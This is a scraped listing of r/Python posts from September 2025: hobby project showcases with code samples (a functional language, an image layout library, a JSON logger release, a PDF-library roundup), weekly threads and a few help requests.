1nbkguo,I built a programming language interpreted in Python!,piequals-3,87,11,2025-09-08 10:50:58,https://www.reddit.com/r/Python/comments/1nbkguo/i_built_a_programming_language_interpreted_in/,"Hey!

I'd like to share a project I've been working on: A functional programming language that I built entirely in Python.

I'm primarily a Python developer, but I wanted to understand functional programming concepts better. Instead of just reading about them, I decided to build my own FP language from scratch. It started as a tiny DSL (domain specific language) for a specific problem (which it turned out to be terrible for!), but I enjoyed the core ideas enough to expand it into a full functional language.

## What My Project Does

NumFu is a pure functional programming language interpreted in Python featuring:
- **Arbitrary precision arithmetic** using `mpmath` - no floating point issues
- **Automatic partial application** and function composition 
- **Built-in testing syntax** with readable assertions
- **Tail call optimization** for efficient recursion
- **Clean syntax** with only four types (Number, Boolean, List, String)

Here's a taste of the syntax:

```numfu
// Functions automatically partially apply
>>> {a, b, c -> a + b + c}(_, 5)
{a, c -> a+5+c}  // Even prints as readable syntax!

// Composition and pipes
let add1 = {x -> x + 1},
    double = {x -> x * 2}
in 5 |> (add1 >> double) // 12

// Built-in testing
let square = {x -> x * x} in
square(7) ---> $ == 49  // ‚úì passes
```

## Target Audience

This is **not** a production language - it's 2-5x slower than Python due to double interpretation. It's more of a learning tool for:
- Teaching functional programming concepts without complex syntax
- Sketching mathematical algorithms where precision matters more than speed
- Understanding how interpreters work

## Comparison

NumFu has much simpler syntax than traditional functional languages like Haskell or ML and no complex type system - just four basic types. It's less powerful but much more approachable. I designed it to make FP concepts accessible without getting bogged down in advanced language features. Think of it as functional programming with training wheels.

## Implementation Details

The implementation is about 3,500 lines of Python using:
- *Lark* for parsing
- *Tree-walking interpreter* - straightforward recursive evaluation  
- *mpmath* for arbitrary precision arithmetic


## Try It Out

```bash
pip install numfu-lang
numfu repl
```

## Links

I actually enjoy web design, so NumFu has a (probably overly fancy) landing page + documentation site. üòÖ

- GitHub: https://github.com/rphle/numfu  
- Website: https://rphle.github.io/numfu/
- Documentation: https://rphle.github.io/numfu/docs
- PyPI: https://pypi.org/project/numfu-lang/

I built this as a learning exercise and it's been fun to work on. Happy to answer questions about design choices or implementation details! I also really appreciate issues and pull requests!
"
1nbh74t,"what are some concepts i need to know to build a mini ""FASTAPI""",Silver_Equivalent_58,0,21,2025-09-08 07:21:48,https://www.reddit.com/r/Python/comments/1nbh74t/what_are_some_concepts_i_need_to_know_to_build_a/,"ive been wanting to implement a super minimalist version of fastapi, but the codebase is a bti overwhelming. what are some concepts i need to understand and how to approach building this?

  
thanks"
1nb8x34,Monday Daily Thread: Project ideas!,AutoModerator,9,1,2025-09-08 00:00:30,https://www.reddit.com/r/Python/comments/1nb8x34/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1nb8bdn,My Python library to create images from simple layouts,_unknownProtocol,8,0,2025-09-07 23:32:44,https://www.reddit.com/r/Python/comments/1nb8bdn/my_python_library_to_create_images_from_simple/,"Hey r/Python,

I'm working on an open-source library for creating images from code. The idea is to build visuals by describing them as simple layouts, instead of calculating `(x, y)` coordinates for everything.

For example, I used it to generate this fake Reddit post card:

[Resulting Image](https://i.imgur.com/JUFXMzK.png)

This whole image was created with the Python code below. It handles all the layout, font fallbacks, text wrapping, and rendering for you.

```python
from pictex import *

# --- 1. Define the small components ---
upvote_icon = Image(""upvote.png"")
downvote_icon = Image(""downvote.png"")
comment_icon = Image(""comment.png"").resize(0.7)
python_icon = Image(""python_logo.png"").size(25, 25).border_radius('50%')

flair = Text(""Showcase"").font_size(12).padding(2, 6).background_color(""#0079D3"").color(""white"").border_radius(10)

# --- 2. Build the layout by composing components ---
vote_section = Column(
    upvote_icon,
    Text(""51"").font_size(40).font_weight(700),
    downvote_icon
).horizontal_align('center').gap(5)

post_header = Row(
    python_icon,
    Text(""r/Python ‚Ä¢ Posted by u/_unknownProtocol"").font_size(14),
    flair
).gap(8).vertical_align('center')

post_title = Text(
    ""My Python library to create images from simple layouts""
).font_size(22).font_weight(700).line_height(1.2)

post_footer = Row(
    comment_icon,
    Text(""12 Comments"").font_size(14).font_weight(700),
).gap(8).vertical_align('center')

# --- 3. Assemble the final card ---
main_card = Row(
    vote_section.padding(0, 15, 0, 0),
    Column(post_header, post_title, post_footer).gap(10)
).padding(20).background_color(""white"").border_radius(10).size(width=600).box_shadows(
    Shadow(offset=(5, 5), blur_radius=10, color=""#00000033"")
)

# --- 4. Render on a canvas ---
canvas = Canvas().background_color(LinearGradient([""#F0F2F5"", ""#DAE0E6""])).padding(40)
image = canvas.render(main_card)
image.save(""reddit_card.png"")
```

---

### What My Project Does

It's a layout engine that renders to an image. You build your image by nesting components (`Row`, `Column`, `Text`, `Image`), and the library figures out all the sizing and positioning for you, using a model inspired by CSS Flexbox. You can style any element with padding, borders, backgrounds, and shadows. It also handles fonts and emojis, automatically finding fallbacks if a character isn't supported.

### Target Audience

It's for any Python dev who wants to create images from code, especially when the content is dynamic. For example:
*   Automating social media posts or quote images.
*   Generating Open Graph images for a website on the fly.
*   Creating parts of an infographic or a report.

The project is currently in Beta. It's pretty solid for most common use cases, but you might still find some rough edges.

### Comparison

*   **vs. Pillow/OpenCV:** Think of Pillow/OpenCV as a digital canvas where you have to specify the exact `(x, y)` coordinates for everything you draw. This library is more of a layout manager: you describe *how* elements should be arranged, and it does the math for you.
*   **vs. HTML/CSS-to-Image libraries:** They're powerful, but they usually require a full web browser engine (like Chrome) to work, which can be a heavy dependency. This library uses Skia directly and is a standard `pip install`.

---

I'm still working on it, and any feedback or suggestions are very welcome.

You can find more examples in the repository. Thanks for taking a look!

*   **GitHub Repo:** [https://github.com/francozanardi/pictex](https://github.com/francozanardi/pictex)
*   **PyPI Page:** [https://pypi.org/project/pictex/](https://pypi.org/project/pictex/)"
1nb5rhw,"lilpipe: a tiny, typed pipeline engine (not a DAG)",easy_peazy,44,4,2025-09-07 21:42:32,https://www.reddit.com/r/Python/comments/1nb5rhw/lilpipe_a_tiny_typed_pipeline_engine_not_a_dag/,"At work, I develop data analysis pipelines in Python for the lab teams. Oftentimes, the pipelines are a little too lightweight to justify a full DAG.¬†[lilpipe](https://github.com/andrewruba/lilpipe)¬†is my attempt at the minimum feature set to run those pipelines without extra/unnecessary infrastructure.

# What My Project Does

* Runs sequential, in-process pipelines (not a DAG/orchestrator).
* Shares a typed, Pydantic PipelineContext across steps (assignment-time validation if you want it).
* Skips work via fingerprint caching (fingerprint\_keys).
* Gives simple control signals: ctx.abort\_pass() (retry current pass) and ctx.abort\_pipeline() (stop).
* Lets you compose steps: Step(""name"", children=\[...\]).

# Target Audience

* Data scientists / lab scientists who use notebooks or small scripts and want a shared context across steps.
* Anyone maintaining ‚Äúglue‚Äù scripts that could use caching and simple retry/abort semantics.
* Bio-analytical analysis: load plate ‚Üí calibrate ‚Üí QC ‚Üí report (ie. this project's origin story).
* Data engineers with one-box batch jobs (CSV ‚Üí clean ‚Üí export) who don‚Äôt want a scheduler and metadata DB (a bit of a stretch, I know).

# Comparison

* Airflow/Dagster/Prefect: Full DAG/orchestrators with schedulers, UIs, state, lineage, retries, SLAs/backfills. lilpipe is intentionally not that. It‚Äôs for linear, in-process pipelines where that stack is overkill.
* scikit-learn Pipeline: ML-specific fit/transform/predict on estimators. lilpipe is general purpose steps with a Pydantic context.
* Other lightweight pipeline libraries: don't have the exact features that I use on a day-to-day basis. lilpipe does have those features haha.

Thanks, hoping to get feedback. I know there are many variations of this but it may fit a certain data analysis niche.

[lilpipe](https://github.com/andrewruba/lilpipe)"
1nb05ab,Prompt components - a better library for managing LLM prompts,swiss_shepherd,0,7,2025-09-07 18:02:44,https://www.reddit.com/r/Python/comments/1nb05ab/prompt_components_a_better_library_for_managing/,"I started an Agentic AI company that has recently winded down, and we're happy to open source this library for managing prompts for LLMs!


### What My Project Does

Create components (blocks of text) that can be composed and shared across different prompts. This library enables isolated testing of each component, with support for standard python string formatting and jinja2.

The library came about because we were pulling our hair out trying to re-use different prompts across our codebase.

### Target Audience

This library is for you if you:

\- have written templates for LLMs and want proper type hint support

\- want a clean way to share blocks of text between prompts

### Comparison

Standard template engines lack clear ways to organize shared text between different prompts.

This library utilizes dataclasses to write prompts.

### Dataclasses for composable components

    @dataclass_component
    class InstructionsXml:
        _template = ""<instructions> {text} </instructions>""
        text: str
    
    @dataclass_component
    class Prompt(StringTemplate):
        _template = """"""
        ## AI Role
        {ai_role}
    
        ## Instructions
        {instructions}
        """"""
    
        ai_role: str
        instructions: Instructions
    
    prompt = Prompt(
        ai_role=""You are an expert coder."",
        instructions=Instructions(
           text=""Write python code to satisfy the user's query.""
        )
    )
    print(prompt.render()) # Renders the prompt as a string

The \`InstructionsXml\` component can be used in other prompts and also is easily swapped out! More powerful constructs are possible using dataclass features + jinja2.

Library here:¬†[https://github.com/jamesaud/prompt-components](https://github.com/jamesaud/prompt-components)"
1nazumb,Class type parameters that actually do something,Bob_Dieter,52,30,2025-09-07 17:51:49,https://www.reddit.com/r/Python/comments/1nazumb/class_type_parameters_that_actually_do_something/,"I was bored, so I made type parameters for python classes that are accessible within your class and contribute to behaviour . Check them out:

[https://github.com/arikheinss/ParametricTypes.py](https://github.com/arikheinss/ParametricTypes.py)

    T = TypeVar(""T"")
    
    class wrapper[T](metaclass = ParametricClass):
        ""silly wrapper class with a type restriction""
    
        def __init__(self, x: T):
            self.set(x)
    
        def set(self, v: T):
            if not isinstance(v, T):
                raise TypeError(f""wrapper of type ({T}) got value of type {type(v)}"")
            self.data = v
    
        def get(self) -> T:
            return self.data
    # =============================================
        
    w_int = wrapper[int](2)
    
    w_int.set(4)
    print(w_int.get()) # 4
    
    print(isinstance(wrapper[int], type)) # True
    
    w_int.set(""hello"") # error!! Wrong type!
    w_2 = wrapper(None) # error!! Missing type parameters!!

edit: after some discussion in the comments, I want to highlight that one central component of this mechanism is that we get different types from applying the type parameters, i.e.:

```
isinstance(w_int, wrapper) # True
isinstance(w_int, wrapper[int]) # True
isinstance(w_int, wrapper[float]) # False
type(wrapper[str]("""")) == type(wrapper[int](2)) # False
```

For the Bot, so it does not autoban me again:

* **What My Project Does** Is explained above
* **Target Audience** Toyproject - Anyone who cares
* **Comparison** The Python GenericAlias exists, but does not really integrate with the rest of the type system."
1nax88a,ML Data Pipeline pain points,3DMakeorg,0,0,2025-09-07 16:10:08,https://www.reddit.com/r/Python/comments/1nax88a/ml_data_pipeline_pain_points/,"Researching ML data pipeline pain points. For production ML builders: what's your biggest training data prep frustration?

üîç Data quality?
‚è±Ô∏è Labeling bottlenecks? 
üí∞ Annotation costs?
‚öñÔ∏è Bias issues?

Share your real experiences!"
1navllc,Does any body have problems with the openai agents library?,SnooBooks7077,0,2,2025-09-07 15:06:54,https://www.reddit.com/r/Python/comments/1navllc/does_any_body_have_problems_with_the_openai/,"    from
     agents 
    import
     Agent, Runner, trace
    from
     agents.mcp 
    import
     MCPServerStdio

for these two lines It took over 2 mins to complete and in the end I got this error: 

    ---------------------------------------------------------------------------
    AttributeError                            Traceback (most recent call last)
    Cell In[1], line 1
    ----> 1 from agents import Agent, Runner, trace
          2 from agents.mcp import MCPServerStdio
    
    File c:\Users\orise\projects\course - Copy\.venv1\Lib\site-packages\agents\__init__.py:22
         19 from __future__ import print_function
         21 from . import algorithms
    ---> 22 from . import scripts
         23 from . import tools
    
    File c:\Users\orise\projects\course - Copy\.venv1\Lib\site-packages\agents\scripts\__init__.py:21
         18 from __future__ import division
         19 from __future__ import print_function
    ---> 21 from . import train
         22 from . import utility
         23 from . import visualize
    
    File c:\Users\orise\projects\course - Copy\.venv1\Lib\site-packages\agents\scripts\train.py:33
         30 import tensorflow as tf
         32 from agents import tools
    ---> 33 from agents.scripts import configs
         34 from agents.scripts import utility
         37 def _create_environment(config):
    
    File c:\Users\orise\projects\course - Copy\.venv1\Lib\site-packages\agents\scripts\configs.py:26
         23 import tensorflow as tf
         25 from agents import algorithms
    ---> 26 from agents.scripts import networks
         29 def default():
         30   """"""Default configuration for PPO.""""""
    
    File c:\Users\orise\projects\course - Copy\.venv1\Lib\site-packages\agents\scripts\networks.py:30
         26 import tensorflow as tf
         28 import agents
    ---> 30 tfd = tf.contrib.distributions
         33 # TensorFlow's default implementation of the KL divergence between two
         34 # tf.contrib.distributions.MultivariateNormalDiag instances sometimes results
         35 # in NaN values in the gradients (not in the forward pass). Until the default
         36 # implementation is fixed, we use our own KL implementation.
         37 class CustomKLDiagNormal(tfd.MultivariateNormalDiag):
    
    AttributeError: module 'tensorflow' has no attribute 'contrib'

All of the libraries were installed right before running the code.   
Had it also happened to you?

"
1naohtd,7 Free Python PDF Libraries You Should Know in 2025,TieTraditional5532,0,7,2025-09-07 09:05:23,https://www.reddit.com/r/Python/comments/1naohtd/7_free_python_pdf_libraries_you_should_know_in/,"# Why PDFs Are Still a Headache

You receive a PDF from a client, and it looks harmless. Until you try to copy the data. Suddenly, the text is broken into random lines, the tables look like modern art, and you‚Äôre thinking:¬†*‚ÄúThis can‚Äôt be happening in 2025.‚Äù*

Clients don‚Äôt want excuses. They want clean Excel sheets or structured databases. And you? You‚Äôre left staring at a PDF that seems harder to crack than the Da Vinci Code.

Luckily, the Python community has created¬†**free Python PDF libraries**¬†that can do everything: extract text, capture tables, process images, and even apply OCR for scanned files.

A client once sent me a 200-page scanned contract. They expected all the financial tables in Excel by the next morning. Manual work? Impossible. So I pulled out my toolbox of Python PDF libraries‚Ä¶ and by sunrise, the Excel sheet was sitting in their inbox. (Coffee was my only witness.)

# 1. pypdf

See¬†[repository¬†](https://github.com/py-pdf/pypdf)on GitHub

**What it‚Äôs good for:**¬†splitting, merging, rotating pages, extracting text and metadata.

* Tip: Great for automation workflows where you don‚Äôt need perfect formatting, just raw text or document restructuring.

**Client story:**¬†A law firm I worked with had to merge thousands of PDF contracts into one document before archiving them. With¬†`pypdf`, the process went from hours to minutes

    from pypdf import PdfReader, PdfWriter
    
    reader = PdfReader(""contract.pdf"")
    writer = PdfWriter()
    for page in reader.pages:
        writer.add_page(page)
    
    with open(""merged.pdf"", ""wb"") as f:
        writer.write(f)

# 2. pdfplumber

See¬†[repository¬†](https://github.com/jsvine/pdfplumber)on GitHub

**Why people love it:**¬†It extracts text¬†**with structure**¬†‚Äî paragraphs, bounding boxes, tables.

* Pro tip: Use¬†`extract_table()`¬†when you want quick CSV-like results.
* Use case: A marketing team used pdfplumber to extract pricing tables from competitor brochures ‚Äî something copy-paste would never get right.

&#8203;

    import pdfplumber
    with pdfplumber.open(""brochure.pdf"") as pdf:
        first_page = pdf.pages[0]
        print(first_page.extract_table())

# 3. PDFMiner.six

[See repository on GitHub](https://github.com/pdfminer/pdfminer.six)

**What makes it unique:**¬†Access to low-level layout details ‚Äî fonts, positions, character mapping.

* **Example scenario:**¬†An academic researcher needed to preserve footnote references and exact formatting when analyzing historical documents.¬†`PDFMiner.six`¬†was the only library that kept the structure intact.

&#8203;

    from pdfminer.high_level import extract_text
    print(extract_text(""research_paper.pdf""))

# 4. PyMuPDF (fitz)

[See repository on GitHub](https://github.com/pymupdf/PyMuPDF)

**Why it stands out:**¬†Lightning-fast and versatile. It handles text, images, annotations, and gives you precise coordinates.

* Tip: Use¬†`""blocks""`¬†mode to extract content by sections (paragraphs, images, tables).
* Client scenario: A publishing company needed to extract all embedded images from e-books for reuse. With PyMuPDF, they built a pipeline that pulled images in seconds.

&#8203;

    import fitz
    doc = fitz.open(""ebook.pdf"")
    page = doc[0]
    print(page.get_text(""blocks""))

# 5. Camelot

[See repository on GitHub](https://github.com/camelot-dev/camelot)

**What it‚Äôs built for:**¬†Extracting¬†**tables**¬†with surgical precision.

* Modes:¬†`lattice`¬†(PDFs with visible lines) and¬†`stream`¬†(no visible grid).
* Real use: An accounting team automated expense reports, saving dozens of hours each quarter.

&#8203;

    import camelot
    tables = camelot.read_pdf(""expenses.pdf"", flavor=""lattice"")
    tables[0].to_csv(""expenses.csv"")

# 6. tabula-py

[See repository on GitHub](https://github.com/chezou/tabula-py)

**Why it‚Äôs popular:**¬†A Python wrapper around¬†**Tabula (Java)**¬†that sends tables straight into pandas DataFrames.

* **Tip for analysts:**¬†If your workflow is already in pandas,¬†`tabula-py`¬†is the fastest way to integrate PDF data.
* **Example:**¬†A data team at a logistics company parsed invoices and immediately used pandas for KPI dashboards.

&#8203;

    import tabula
    df_list = tabula.read_pdf(""invoices.pdf"", pages=""all"")
    print(df_list[0].head())

# 7. OCR with pytesseract + pdf2image

[Tesseract OCR | pdf2image](https://github.com/tesseract-ocr/tesseract)

**When you need it:**¬†For scanned PDFs with no embedded text.

* Pro tip: Always preprocess images (resize, grayscale, sharpen) before sending them to Tesseract.
* Real scenario: A medical clinic digitized old patient records. OCR turned piles of scans into searchable text databases.

&#8203;

    from pdf2image import convert_from_path
    import pytesseract
    
    pages = convert_from_path(""scanned.pdf"", dpi=300)
    text = ""\n"".join(pytesseract.image_to_string(p) for p in pages)
    print(text)

# Bonus: Docling (AI-Powered)

[See repository on GitHub](https://github.com/DS4SD/docling)

**Why it‚Äôs trending:**¬†Over 10k ‚≠ê in weeks. It uses AI to handle complex layouts, formulas, diagrams, and integrates with modern frameworks like LangChain.

* Example: Researchers use it to process scientific PDFs with math equations, something classic libraries often fail at.

# Final Thoughts

Extracting data from PDFs no longer has to feel like breaking into a vault. With these¬†**free Python PDF libraries**, you can choose the right tool depending on whether you need raw text, structured tables, or OCR for scanned documents."
1nalqfh,"Need advice with low-level disk wiping (HPA/DCO, device detection)",Monster-07,0,2,2025-09-07 06:11:50,https://www.reddit.com/r/Python/comments/1nalqfh/need_advice_with_lowlevel_disk_wiping_hpadco/,"i‚Äôm currently working on a project that wipes data from storage devices including hidden sectors like **HPA (Host Protected Area)** and **DCO (Device Configuration Overlay)**.

Yes, I know tools already exist for data erasure, but most don‚Äôt properly handle these hidden areas. My goal is to build something that:

* Communicates at a **low level** with the disk to securely wipe even HPA/DCO.
* **Detects disk type** automatically (HDD, SATA, NVMe, etc.).
* Supports multiple sanitization methods (e.g., **NIST SP 800-88, DoD 5220.22-M**, etc.).

I‚Äôm stuck on the part about **low-level communication with the disk for wiping**. Has anyone here worked on this or can guide me toward resources/approaches?"
1nakbd6,Python-JSON-Logger v4.0.0.rc1 Released,nicholashairs,60,2,2025-09-07 04:48:52,https://www.reddit.com/r/Python/comments/1nakbd6/pythonjsonlogger_v400rc1_released/,"Hi All, maintainer of [python-json-logger](https://github.com/nhairs/python-json-logger) here with a new (pre) release for you.

It can be installed using `python-json-logger==4.0.0.rc1`

# What's new?

This release has a few quality of life improvements that also happen to be breaking changes. The [full change log is here](https://nhairs.github.io/python-json-logger/4.0.0/changelog/) but to give an overview:

**Support for** `ext://` **when using** `dictConfig` **/** `fileConfig`

This allows you to reference Python objects in your config for example:

    version: 1
    disable_existing_loggers: False
    formatters:
      default:
        ""()"": pythonjsonlogger.json.JsonFormatter
        format: ""%(asctime)s %(levelname)s %(name)s %(module)s %(funcName)s %(lineno)s %(message)s""
        json_default: ext://logging_config.my_json_default
        rename_fields:
          ""asctime"": ""timestamp""
          ""levelname"": ""status""
        static_fields:
          ""service"": ext://logging_config.PROJECT_NAME
          ""env"": ext://logging_config.ENVIRONMENT
          ""version"": ext://logging_config.PROJECT_VERSION
          ""app_log"": ""true""
    handlers:
      default:
        formatter: default
        class: logging.StreamHandler
        stream: ext://sys.stderr
      access:
        formatter: default
        class: logging.StreamHandler
        stream: ext://sys.stdout
    loggers:
      uvicorn.error:
        level: INFO
        handlers:
          - default
        propagate: no
      uvicorn.access:
        level: INFO
        handlers:
          - access
        propagate: no

**Support for easier to use formats**

We now support a comma `style="",""` style which lets use a comma seperate string to specific fields.

    formatter = JsonFormatter(""message,asctime,exc_info"", style="","")

We also using any sequence of strings (e.g. lists or tuples).

    formatter = JsonFormatter([""message"", ""asctime"", ""exc_info""])

# What is Python JSON Logger

If you've not heard of this package, Python JSON Logger enables you produce JSON logs when using Python's¬†`logging`¬†package.

JSON logs are machine readable allowing for much easier parsing and ingestion into log aggregation tools.

For example here is the (formatted) log output of one of my programs:

    {
      ""trace_id"": ""af922f04redacted"",
      ""request_id"": ""cb1499redacted"",
      ""parent_request_id"": null,
      ""message"": ""Successfully imported redacted"",
      ""levelname"": ""INFO"",
      ""name"": ""redacted"",
      ""pathname"": ""/code/src/product_data/consumers/games.py"",
      ""lineno"": 41,
      ""timestamp"": ""2025-09-06T08:00:48.485770+00:00""
    }

# Why post to Reddit?

Although Python JSON Logger [is in the top 300 downloaded packaged from PyPI](https://hugovk.github.io/top-pypi-packages/) (in the last month it's been downloaded more times that UV! ... just), there's not many people watching the repository [after it changed hands](https://www.reddit.com/r/Python/comments/1hcm2rr/pythonjsonlogger_has_changed_hands/) at the end of 2024.

This seemed the most appropriate way to share the word in order to minimise disruptions once it is released."
1nagdcd,TempoCut ‚Äî Broadcast-style audio/video time compression in Python,dareenmahboi,4,7,2025-09-07 01:19:34,https://www.reddit.com/r/Python/comments/1nagdcd/tempocut_broadcaststyle_audiovideo_time/,"Hi all ‚Äî I just released \*\*TempoCut\*\*, a Python project that recreates broadcast-style time compression (like the systems TV networks used to squeeze shows into fixed time slots).



\### What My Project Does

\- Compresses video runtimes while keeping audio/video/subtitles in sync

\- Audio ‚Äúskippy‚Äù compression with crossfade blending (stereo + 5.1)

\- DTW-based video retiming at 59.94p with micro-smear blending

\- Exports Premiere Pro markers for editors

\- Automatic subtitle retiming using warp maps

\- Includes a one-click batch workflow for Windows



Repo: https://github.com/AfvFan99/TempoCut



\### Target Audience

TempoCut is for:

\- Hobbyists and pros curious about how broadcast time-tailoring works

\- Editors who want to experiment with time compression outside of proprietary hardware

\- Researchers or students interested in DSP / dynamic time warping in Python



This is not intended for mission-critical production broadcasting, but it‚Äôs close to what real networks used.



\### Comparison

\- Professional solutions (like Prime Image Time Tailor) are \*\*expensive, closed-source, and hardware-based\*\*.  

\- TempoCut is \*\*free, open-source, and Python-based\*\* ‚Äî accessible to anyone.  

\- While simple FFmpeg speed changes distort pitch or cause sync drift, TempoCut mimics broadcast-style micro-skips with far fewer artifacts.  



Would love feedback ‚Äî especially on DSP choices, performance, and making it more portable for Linux/Mac users. üöÄ

"
1nag19u,ensures: simple Design by Contract,poopatroopa3,26,4,2025-09-07 01:02:47,https://www.reddit.com/r/Python/comments/1nag19u/ensures_simple_design_by_contract/,"* **What My Project Does**

There are a few other packages for this, but I decided to make one that is simple, readable, accepts arbitrary functions, and uses the Result type from functional programming. You can find more details in the readme: [https://github.com/brunodantas/ensures](https://github.com/brunodantas/ensures)

>ensures is a simple Python package that implements the idea of Design by Contract described in the Pragmatic Paranoia chapter of The Pragmatic Programmer. That's the chapter where they say you should trust nobody, not even yourself.

* **Target Audience**¬†(e.g., Is it meant for production, just a toy project, etc.)

Anyone interested in ~~paranoia~~ decorating functions with precondition functions etc and use a Functional data structure in the process.

I plan to add pytest tests to make this more production-ready. Any feedback is welcome.

* **Comparison**¬†(A brief comparison explaining how it differs from existing alternatives.)

None of the alternatives I found seem to implement arbitrary functions plus the Result type, while being simple and readable.

But some of the alternatives are icontract, contracts, deal. Each with varying levels of the above."
1naeqh3,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,3,5,2025-09-07 00:00:31,https://www.reddit.com/r/Python/comments/1naeqh3/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1naeauz,Another free Python 3 Tkinter Book,caudor,8,3,2025-09-06 23:40:02,https://www.reddit.com/r/Python/comments/1naeauz/another_free_python_3_tkinter_book/,"If you are interested, you can click the top link on my landing page and download my eBook, ""Tkinter in Python 3, De-mystified"" for free:¬†[https://linktr.ee/chris4sawit](https://linktr.ee/chris4sawit)

I recently gave away a Beginner's Python Book and that went really well

So I hope this 150 page pdf will be useful for someone interested in Tkinter in Python. Since it is sometimes difficult to copy/paste from a pdf, I've added a .docx and .md version as well.  The link will download all 3 as a zip file.  No donations will be requested. Only info needed is an email address to get the download link."
1na9zkr,I used Python and pdfplumber to build an agentic system for analyzing arXiv papers,thought_terror,0,3,2025-09-06 20:31:17,https://www.reddit.com/r/Python/comments/1na9zkr/i_used_python_and_pdfplumber_to_build_an_agentic/,"Hey guys, I wanted to share a project I've been working on,¬†arxiv-agent. It's an open-source tool built entirely in Python

Live Demo (Hugging Face Spaces): [https://huggingface.co/spaces/midnightoatmeal/arxiv-agent](https://huggingface.co/spaces/midnightoatmeal/arxiv-agent)

Code (GitHub):¬†[https://github.com/midnightoatmeal/arxiv-agent](https://github.com/midnightoatmeal/arxiv-agent)

**What My Project Does**

arxiv-agent is an agentic AI system that ingests an academic paper directly from an arXiv ID and then stages a structured, cited debate about its claims. It uses three distinct AI personas: an Optimist, a Skeptic, and an Ethicist, to analyze the paper's strengths, weaknesses, and broader implications. The pipeline is built using¬†`requests`¬†to fetch the paper and¬†`pdfplumber`¬†to parse the text, which is then orchestrated through an LLM to generate the debate.

**Target Audience**

Right now, it's primarily a¬†portfolio project and a proof-of-concept. It's designed for¬†researchers, students, and ML engineers¬†who want a quick, multi-faceted overview of a new paper beyond a simple summary. While it's a ""toy project"" in its current form, the underlying agentic framework could be adapted for more production-oriented use cases like internal research analysis or due diligence.

**Comparison**

Most existing tools for paper analysis focus on¬†single-perspective summarization¬†(like TLDR generation) or¬†keyword extraction. The main difference with¬†arxiv-agent¬†is its¬†multi-perspective, dialectical approach. Instead of just telling you¬†*what*¬†the paper says, it models¬†*how to think about*¬†the paper by staging a debate. This helps uncover potential biases, risks, and innovative ideas that a standard summary might miss. It also focuses on grounding its claims in the source text to reduce hallucination.

Would love any feedback! thank you checking it out!"
1na9od6,Built a free VS Code extension for Python dependencies - no more PyPI tab switching,benbenbang,38,18,2025-09-06 20:18:17,https://www.reddit.com/r/Python/comments/1na9od6/built_a_free_vs_code_extension_for_python/,"Tired of switching to PyPI tabs to check package versions?

Just released **Tombo** \- brings PyPI directly into VS Code:

**What it does (complements your existing workflow):**

* uv/poetry handle installation ‚Üí Tombo handles version selection
* Hover `requests` ‚Üí see ALL versions + Python compatibility
* Type `numpy>=` ‚Üí intelligent version suggestions for your project
* Perfect for big projects (10+ deps) - no more version hunting
* Then let uv/poetry create the lock files

**Demo in 10 seconds:**

1. Open any Python project
2. Type `django>=`
3. Get instant version suggestions
4. Hover packages for release info

**Installation:** VS Code ‚Üí Search ""Tombo"" ‚Üí Install

**Free & open source** \- no tracking, no accounts, just works.

‚≠ê **Star the project** if you find it useful: [https://github.com/benbenbang/tombo](https://github.com/benbenbang/tombo)

VS Code Marketplace: [https://marketplace.visualstudio.com/items?itemName=benbenbang.tombo](https://marketplace.visualstudio.com/items?itemName=benbenbang.tombo)

Documentation: [https://benbenbang.github.io/tombo/](https://benbenbang.github.io/tombo/)

Anyone else tired of manual PyPI lookups? ü§¶‚Äç‚ôÇÔ∏è"
1na6xqg,Simple Keyboard Count Tracker,fran_m99,2,4,2025-09-06 18:28:20,https://www.reddit.com/r/Python/comments/1na6xqg/simple_keyboard_count_tracker/,"**What My Project Does:**  
This simple Python script tracks your keyboard in the background and logs every key you press. You can track your total keystrokes, see which keys you hit the most, and all that with a fancy keyboard display with a color gradient.

Whether you‚Äôre curious about your productivity, want to visualize your keyboard usage, or just enjoy quirky data experiments

**Target Audience:**  
People interested in knowing more about their productivity, or just data enthusiasts like me :)

**Comparison:**  
I Couldn't find a similar lightweight tool that works in the background and is easy to use, so I decided to build my own using Python.

**Repo Link:**  
[https://github.com/Franm99/keyboard-tracker](https://github.com/Franm99/keyboard-tracker)

Would love feedback, suggestions, or improvements from the community!"
